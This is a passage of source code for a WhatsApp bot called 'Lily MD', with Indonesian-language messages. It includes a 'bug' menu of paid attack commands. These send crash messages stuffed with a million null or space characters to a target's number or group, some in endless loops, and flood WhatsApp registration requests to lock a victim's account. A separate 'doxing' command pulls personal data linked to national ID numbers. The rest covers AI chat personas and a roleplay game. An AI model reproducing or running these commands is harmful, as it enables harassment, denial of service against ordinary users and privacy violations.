  }
}, { quoted: m })
return await Lily.relayMessage(m.chat, msgs.message, {})
    }
  }
}
//==================《 EXIT DOWNLOADER 》======================\\



//==================《 BUG MENY DISINI 》======================\\
        break;
case 'lockotp': case 'tempban': {
	if (!isPremium) return reply(mess.prem)
  if (args.length < 1) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 62|8xxxx`);
  const CountryCode = args2[0];
  const xtarget = args2[1];
  const Number = xtarget.replace('@s.whatsapp.net', '');
  const merge = `${CountryCode}${xtarget}`
  const Mention = merge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "Successfully Activated OTP LOCK To @" + Mention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Mention]
  );
  try {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const Request = await Lily.requestRegistrationCode({
      phoneNumber: '+' + CountryCode + `${Number}`,
      phoneNumberCountryCode: CountryCode,
      phoneNumberNationalNumber: `${Number}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var Prefix = Math.floor(Math.random() * 999);
      var Suffix = Math.floor(Math.random() * 999);
      await Lily.register(`${Prefix}-${Suffix}`);
    } catch (err) {
      console.log(`${Prefix}-${Suffix}`);
    }
  }
}
        break;

case 'oneshot': {
	if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Masukan Nomor mu kak,\n\nExample : .${command} 62xxxxx`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return reply(`Example : ${prefix+command} 916909137213`)
var contactInfo = await Lily.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
    }
    if (cleanedNumber == "919366316008") {
    return;
    }
    if (cleanedNumber == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  async function IosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await Lily.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '𝑳𝒊𝒍𝒚 𝑩𝒐𝒕𝒛 𝑴𝒅𝒛',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '𝑯𝒊𝒍𝒍𝒂𝒓𝒚 𝑨𝒃𝒊𝒈𝒂𝒊𝒍 | 𝑳𝒊𝒍𝒚 𝑴𝑫',
								title: '𝑳𝒊𝒍𝒚 𝑴𝑫 | 𝑩𝒚 𝑭𝒂𝒍𝒍𝒁𝒙',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await Lily.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"Lily MD","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await Lily.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '𝑯𝒊𝒍𝒍𝒂𝒓𝒚 𝑨𝒃𝒊𝒈𝒂𝒊𝒍 | 𝑳𝒊𝒍𝒚 𝑴𝑫',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : '𝑳𝒊𝒍𝒚 𝑴𝑫 | 𝑩𝒚 𝑭𝒂𝒍𝒍𝒁𝒙', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(1000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}
await reply(`In process....`)
            await IosShot(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
//=================================================//
case 'bug-button': case 'bug-browser': {
if (!isPremium) return m.reply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
m.reply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await Lily.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ︎"
    },
    "footer": {
      "text": "›          # ʜɪʟʟᴀʀʏ ᴀʙɪɢᴀɪʟ"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: lilybot })
await Lily.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
m.reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-gc': case 'penghitaman': {
if (!isPremium) return m.reply(mess.prem)
if (!q) return m.reply(`Penggunaan .${command} 1962623836281@g.us`)
m.reply(mess.bugrespon)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ"
    },
    "footer": {
      "text": "›          # ʜɪʟʟᴀʀʏ ᴀʙɪɢᴀɪʟ"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'ʀɪᴘᴘᴇʀ ᴍᴀᴛɪ ᴀᴊᴀ | ʙʏ ʟɪʟʏ ᴍᴅ', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: lilybot })
await Lily.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
m.reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
        break
//=================================================//
case 'bug-android': case 'restart-ui': {
if (!isPremium) return reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let allin = q.replace(/[^0-9]/g, "")
if (allin.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = allin + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${allin} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'virg4m': case 'bocah-fomo': {
if (!isPremium) return reply(mess.prem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let allin = q.replace(/[^0-9]/g, "")
if (allin.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = allin + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, lilybot)
await ngeloc(target, force)
await pirgam(target, lilybot)
await ngeloc(target, force)
await pirgam(target, lilybot)
await ngeloc(target, force)
await pirgam(target, lilybot)
await ngeloc(target, force)
await pirgam(target, lilybot)
await ngeloc(target, force)
await pirgam(target, lilybot)
await ngeloc(target, force)
await pirgam(target, lilybot)
await ngeloc(target, force)
await pirgam(target, lilybot)
await ngeloc(target, force)
await pirgam(target, lilybot)
}
await reply(`<✓> Successfully Send Bug to ${allin} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'mampuslu-zombie': case 'ga-ngotak': case 'kebal-tubiran': case '1shoot': {
if (!isPremium) return reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let allin = q.replace(/[^0-9]/g, "")
if (allin.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = allin + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await baklis(target, lilybot)
await ngeloc(target, force)
await pirgam(target, lilybot)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${allin} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'wotabul-kontol': case '1day-out': {
if (!isPremium) return reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let allin = q.replace(/[^0-9]/g, "")
if (allin.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = allin + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (;;) {
await ngeloc(target, force)
await baklis(target, lilybot)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, lilybot)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, lilybot)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, lilybot)
await ngeloc(target, force)
await sleep(30000)
}
}
break
//=================================================//
case 'bantai-wotabul': {
if (!isPremium) return reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let allin = q.replace(/[^0-9]/g, "")
if (allin.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
await reply(mess.bugrespon)
  for (;;) {
    await ngeloc(target, lilybot)
  }
}
//==================《 EXIT BUG-BUG 》======================\\

break
case 'sc': case 'script': {
let me = m.sender
let teks = `*Hi @${me.split('@')[0]}🥳
sᴄ ɪɴɪ ᴅɪᴊᴜᴀʟ ʏᴀ ᴋᴀᴋ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ ɪɴғᴏ sᴄʀɪᴘᴛ ɴᴏ ᴇɴᴄ ]
ʙᴏᴛ ɴᴀᴍᴇ = ${botname}
ᴘᴇᴍʙᴜᴀᴛ sᴄʀɪᴘᴛ = ${pembuat}
ᴏᴡɴᴇʀ = .ᴏᴡɴᴇʀ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
ʜᴀʀɢᴀ sᴄʀɪᴘᴛ ɪɴɪ 25.000 sᴀᴛᴜᴀɴ ʏᴀᴋ`
reply(teks) 
}
break
//=========================\\
case 'delsetdone': case 'delsetd':
Lily.sendMessage(from, {
	react: {
		text: "🌊",
		key: m.key
	}
})
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetDone(m.chat, set_done)) return reply(`Belum ada set done di gc ini`)
removeSetDone(m.chat, set_done)
reply(`Sukses delete set done`)
break


//===================《 TEMPAT CASE MENU AI 》=====================\\
case 'luminai': {
	Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
	if (!text) return m.reply(`Contoh: ${prefix+command} hai luminai`);
	const requestData = {
		content: text,
		user: m.sender
	};
	const quoted = m && (m.quoted || m);
	try {
		let response;
		if (quoted && /image/.test(quoted.mimetype || quoted.msg.mimetype)) {
			requestData.imageBuffer = await quoted.download();
		}
		response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
		m.reply(response);
	} catch (err) {
		m.reply(err);
	}
}
break
case 'doxing':{
if (!text) return reply('masukan nik nya')
let rest = await fetchJson(`https://api.kyuurzy.site/api/search/ceknik?query=${text}`)
Lily.sendMessage(m.chat, { text: `Status: *${rest.result.status}*\nPesan : ${rest.result.pesan}\n\nNik : *${rest.result.data.nik}*\nKelamin : *${rest.result.data.kelamin}*\nLahir : *${rest.result.data.lahir}*\nProvinsi : *${rest.result.data.provinsi}*\nKota/Kabupaten : *${rest.result.data.kotakab}*\nKecamatan : *${rest.result.data.kecamatan}*\nUniqcode : *${rest.result.data.uniqcode}*\nKodepos : *${rest.result.data.tambahan.kodepos}*\nPasaran : *${rest.result.data.tambahan.pasaran}*\nUmur : *${rest.result.data.tambahan.usia}*\nUltah : *${rest.result.data.tambahan.ultah}*\nZodiak : *${rest.result.data.tambahan.zodiak}*\n\n*Check Nik KTP (Not a Doxing Feature!!!*)`},{quoted:m})
}
        break
case 'tozombie':
case 'jadizombie': {
  if (!quoted) return reply(`mana fotonya kak?`)
  reply(mess.wait)
  const media = await Lily.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	const data = await fetchJson(`https://widipe.com/converter/zombie?url=${anuu}`)
	const zombie = data.url
	Lily.sendMessage(m.chat, { image: { url: zombie }, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
}
        break 
    case 'ai-fall': {
    if (!text) return reply('nama kamu siapa')
    const promt = `kamu adalah Fall , kamu dibuat oleh seorang laki-laki yang bernama FallZx, owner kamu adalah ${owner}, setiap ada orang yang menanyakan lokasi mu jangan kamu beritahu lokasinya dan katakan saja bahwa kamu tinggal di Amerika Lost Engeles, tuan kamu bernama FallZx-Infinty-Tzy, gunakan bahasa sopan gaul serta ramah kepada semua orang, jika ada yang berkata kasar seperti anjing tolol babi goblog tegurlah dengan mengucapkan astaghfirullah dan berilah dia peringatan yang ada didalam Al Qur'an, panggil seseorang dengan sebutan kata kata dalam bahasa arab, dan ubahlah kata 'saya','aku,'gw' menjadi ana , jika anda ingin meminta maaf katakan afwan , kamu harus berakhlak seperti Rasulullah dan para sahabatnya, jangan menggunakan bahasa baku ,tetapi gunakanlah bahasa sopan dalam bahasa Arab layaknya seorang muslim, jika ada yang menyuruh mu berkata 'kasar/toxic' tegurlah dengan 'dalil Al-Qur'an beserta artinya', dan gantilah ucapan terimakasih menjadi Alhamdulillah, jika ada seseorang yang meminta membuatkan 'kata/bijak' serta 'pantun','pidato' , 'puisi', harus menggunakan bahasa sopan seperti Rasulullah dan para sahabat dan di akhiri dengan kalimat Toyyibah seperti Allahu akbar, Allahu akbar. La ilaha illallahu wallahu akbar. `
    const respons = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${promt}&query=${text}`)
    Lily.sendMessage(m.chat, {
		text: `${respons.result}`
	}, {
		quoted: m
	})
    }
break
//=========================\\
case "lily": {
Lily.sendMessage(from, {react: {text: "🌊", key: m.key}})
  if (!text) {
    return m.reply(`Contoh: ${prefix + command} hai luminai`);
  }
  const prompt = `mulai dari sekarang nama anda adalah Lily, anda adalah seorang kecerdasan buatan yang di buat oleh FallZx-Infinty-Tzy 😆. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu.`
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
    m.reply(response);
  } catch (err) {
    m.reply(err.toString());
  }
}
break;
//=========================\\
case 'biji': {
	if (!text) return reply(`*Example*: ${prefix + command} kamu jelek`)
	let prompt = `Ubah gaya bicaramu dengan bahasa yang singkat, Namamu adalah Hillary,Ubah Kata Kamu menjadi "Lu" Dan Aku Menjadi "gua" Kata penyapamu adalah dengan menyebut ngab, kamu memiliki owner nama ownermu adalah FallXd atau biasa di panggil Dengan sebutan "FallZx",Ubah bahasamu menggunakan bahasa Yang Lembut Dan Sopan, Bahasa Mu menggunakan Bahasa yang gaul dan singkat, kamu memiliki sifat seperti Perempuan dan Sopan, Jika ada yang menanyakan tentang Lily kamu marah` //You can change the prompt as you like
	let burassa = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
	Lily.sendMessage(m.chat, {
		text: `${burassa.result}`
	}, {
		quoted: m
	})
}
break
    case 'blackboxai': {
	if (!text) return m.reply(`Example : ${prefix + command} write a program to delete file`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/blackbox-ai?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Blackbox AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./img//Lily.jpg') }, { upload: Lily.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363186130999681@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Lily.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return m.reply("`*Error*`")
}
}
break

//===================《 TEMPAT CASE MENU OWNER 》=====================\\
case 'self': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
if (!isCreator) return tolakk(mess.OnlyOwner)
global.public = false
m.reply('Sukses Change To Self Mode')
}
break

case 'public': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
if (!isCreator) return tolakk(mess.OnlyOwner)
global.public = true
m.reply('Sukses Change To Public Mode')
}
break


//===================《 TEMPAT CASE MENU GROUP 》=====================\\


//===================《 TEMPAT CASE MENU GAME 》=====================\\

break
// =================《 ROLEPLAY 》 ================= \\
case 'joinrp': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
if (!isGroup) return m.reply('Group Only')
if (args.length == 0) return m.reply(`Example: ${command} Hikari`)
if (!isBrave) return m.reply('Kau sudah terdaftar')
const reason = q ? q : 'Nothing.'
const rosen = 'Tidak Punya'
namerpg.addNameUser(sender, barat, reason, _name)
rumahrpg.addOrangUser(sender, barat, rosen, _rumah)
const aluty = `*Anda berhasil Mendaftar Role Player!*\n\n➸ *Username*: ${pushname}\n➸ *Name Player*: ${reason}`
m.reply(aluty)
}
break
case 'myrpname': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
if (!isBrave) return  m.reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
    const getId = namerpg.getNameId(sender, _name)
    const getReason = namerpg.getNameReason(getId, _name)
    m.reply(`➸ *Username*: ${pushname}\n➸ *Name Player*: ${getReason}`) 
break
}
case 'ceklimitrp': {
m.reply(`Limit Game RP : ${userPotan}/${rplimitawal}\nLimit Anda Akan direset Setiap 6 Jam Sekali`)
    }
break
case 'heal': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
if (!isBrave) return  m.reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
if (!isGroup) return m.reply('Group Only')
m.reply(`SISA HEAL: ${userHeal}`)
}    
break
case 'gumption': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
if (!isBrave) return  m.reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
if (!isGroup) return m.reply('Group Only')
m.reply(`SISA GUMPTION: ${userPotion}`)
    }
break
    case 'crystal': {
    Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
if (!isBrave) return  m.reply(mess.brave)
if (!isGroup) return m.reply('Group Only')
m.reply(`SISA CRYSTAL: ${userCrystal}`)
}
break
case 'healing': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
if(userPotan < 1){ return m.reply(`Limit Kmu Sudah Habis`)}
if (!isBrave) return  m.reply(mess.brave)
if (!isGroup) return m.reply(mess.group)
const healperpotion = 1
const heladadd = 25
const pot = healperpotion * 1
getId = namerpg.getNameId(sender, _name)
getReason = namerpg.getNameReason(getId, _name)
if (isPotion(sender)) return m.reply(`maaf gumption kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
potionAdd(sender, pot)
addHealUser(sender, heladadd)
 helin = `◪ *「 SUKSES HEALING 」*

├─ ❏ *Player* : ${getReason}
├─ ❏ *Gumption terpakai* : 1 
└─ ❏ *Menambah* : 25heal

Note: Hati-Hati Saat Sedang Berpetualang, Banyak Rintangan Untuk Anda`
m.reply(helin)
}
rplimitAdd(sender, rpliminya)
break
case 'buygumption': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
if (!isBrave) return  m.reply(mess.brave)
if (!isGroup) return m.reply('Group Only')
if(userPotan < 1){ return m.reply(`Limit Kmu Sudah Habis`)}
const crysperpotion = 1000
const gumpadd = 1
const fallLily = crysperpotion * 1
getId = namerpg.getNameId(sender, _name)
getReason = namerpg.getNameReason(getId, _name)
if(userCrystal < 1000){ return m.reply(`Maaf Crystal Anda Tersisa ${userCrystal}, Silahkan Melakukan Gaincrystal`)}
 crystalAdd(sender, fallLily)
  addPotioUser(sender, gumpadd)
  const prom1 = `◪ *「 GUMPTION TELAH TERISI 」*

├─ ❏ *NickWa* : *@${pushname}*
├─ ❏ *Player* : *${getReason}*
├─ ❏ *Get Gumption* : *1*
├─ ❏ *Harga* : *1000 Crystal*
└─ ❏ *Sisa Crystal* : *${userCrystal}*`
m.reply(prom1)
    rplimitAdd(sender, rpliminya)   
 break
}
case 'myhouse': {
if(userPotan < 1){ return m.reply(`Limit Kmu Sudah Habis`)}
if (!isGroup) return m.reply('Group Only')
if (!isBrave) return  m.reply(mess.brave)
if(getrumah === 'Tidak Punya') { return m.reply('Anda Tidak Memiliki Rumah, Silahkan Kumpulkan Uang Dan Membeli Rumah') }
getId = namerpg.getNameId(sender, _name)
    getReason = namerpg.getNameReason(getId, _name)
    let userLevel = level.getLevelingLevel(sender, _level)
let userXp = level.getLevelingXp(sender, _level)
let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
let userRank = level.getUserRank(sender, _level)
housee = await getBuffer(myHouse)
Lily.sendImage(m.chat, housee, `Hai ${getReason}
Ini Adalah Rumahmu Dan Kmu Adalah ${orang}

╭─ ❏*「 ABOUT YOURS」*
├─ ❏ Xp : *${userXp} / ${requiredXp}*
├─ ❏ Level : *${userLevel}*
├─ ❏ Role: *${role}*
├─ ❏ Gumption: *${userPotion}*
├─ ❏ Heal: *${userHeal}*
├─ ❏ Crystal: *${userCrystal}*
├─ ❏ Money: *${formatmoney(userPoton ? userPoton : "Rp0,00")}*
├─ ❏ Status: *${orang}*
├─ ❏ House: *${getrumah}*
└─ ❏`, m)
rplimitAdd(sender, rpliminya)
break
}
case 'inventori': case 'inventory':{
if (!isBrave) return  m.reply(mess.brave)
if (!isGroup) return m.reply(mess.group)
let userLevel = level.getLevelingLevel(sender, _level)
let userXp = level.getLevelingXp(sender, _level)
let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
let userRank = level.getUserRank(sender, _level)
let teksehmazeh = `_《 INFO USER 》_\n\n`
teksehmazeh += `• NickWa : *${pushname}*\n`
teksehmazeh += `• Xp : *${userXp} / ${requiredXp}*\n`
teksehmazeh += `• Level : *${userLevel}*\n`
teksehmazeh += `• Role: *${role}*\n`
teksehmazeh += `• Gumption: *${userPotion}*\n`
teksehmazeh += `• Heal: *${userHeal}*\n`
teksehmazeh += `• Crystal: *${userCrystal}*\n`
teksehmazeh += `• Money: *Rp.${userPoton}*\n`
teksehmazeh += `• Status: *${orang}*\n`
teksehmazeh += `• Limit RP: *${userPotan}/${rplimitawal}*\n\n`
teksehmazeh += `_《 HASIL BURUAN 》_\n\n`
teksehmazeh += `• Ikan: *${getIkan(sender)}*\n`
teksehmazeh += `• Ayam: *${getAyam(sender)}*\n`
teksehmazeh += `• Kelinci: *${getKelinci(sender)}*\n`
teksehmazeh += `• Domba: *${getDomba(sender)}*\n`
teksehmazeh += `• Sapi: *${getSapi(sender)}*\n`
teksehmazeh += `• Gajah: *${getGajah(sender)}*`
m.reply(teksehmazeh)
}
break
case 'buyhouse': {
if (!q) return m.reply(`Pilih:\nkayu\nbiasa\nmewah\nkerajaan\n\nExample: ${prefix + command} kerajaan`)
if(userPotan < 1){ return m.reply(`Limit Kmu Sudah Habis`)}
if (!isGroup) return m.reply(mess.group)
if (!isBrave) return
if(q === 'kayu') {
if(orang === 'Orang Biasa'){ return m.reply('Anda Sudah Membeli Rumah Biasa, Tidak Bisa Merendah') }
if(orang === 'Orang Kaya'){ return m.reply('Anda Sudah Membeli Rumah Mewah, Tidak Bisa Merendah') }
if(orang === 'Seorang Raja'){ return m.reply('Anda Sudah Memiliki Kerajaan, Tidak Bisa Merendah') }
if(orang === 'Orang Miskin'){ return m.reply('Anda Sudah Membeli Rumah Ini') }
if(userPoton < 25000){ return m.reply('Uang Anda Tidak Cukup Atau Kurang dari Rp50.000') }
if(userPoton > 25000){
fall = 25000
Lily = fall * 1
const rosen = 'Rumah Kayu'
uangAdd(sender, Lily)  
_rumah.splice(rumahrpg.getOrangPosition(sender, _rumah), 1)
fs.writeFileSync('./database/Orangrpg.json', JSON.stringify(_rumah))
rumahrpg.addOrangUser(sender, time, rosen, _rumah)
m.reply('Berhasil Membeli Rumah Biasa')
}
}
if(q === 'biasa') {
if(orang === 'Orang Kaya'){ return m.reply('Anda Sudah Membeli Rumah Mewah, Tidak Bisa Merendah') }
if(orang === 'Seorang Raja'){ return m.reply('Anda Sudah Memiliki Kerajaan, Tidak Bisa Merendah') }
if(orang === 'Orang Biasa'){ return m.reply('Anda Sudah Membeli Rumah Ini') }
if(userPoton < 50000){ return m.reply('Uang Anda Tidak Cukup Atau Kurang dari Rp50.000') }
if(userPoton > 50000){
fall = 50000
Lily = fall * 1
const rosen = 'Rumah Biasa'
uangAdd(sender, Lily) 
